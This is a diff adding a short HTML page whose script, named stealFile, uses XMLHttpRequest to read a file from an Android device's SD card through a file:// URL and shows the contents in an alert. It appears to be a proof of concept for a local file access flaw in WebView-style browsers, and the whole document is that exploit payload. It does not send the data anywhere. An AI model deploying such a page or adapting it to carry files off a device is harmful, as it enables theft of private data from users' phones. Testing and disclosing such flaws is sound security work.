@@ -1,0 +1,20 @@
+<html>
+<body>
+<script>
+function stealFile()
+{
+	var file = "file:///mnt/sdcard/11.txt";
+	var xmlHttpReq = new XMLHttpRequest();
+	xmlHttpReq.onreadystatechange = function(){
+		if(xmlHttpReq.readyState == 4){
+			alert(xmlHttpReq.responseText);
+		}
+	}
+
+xmlHttpReq.open("GET", file);
+xmlHttpReq.send(null);
+}
+stealFile();
+</script>
+</body>
+</html>
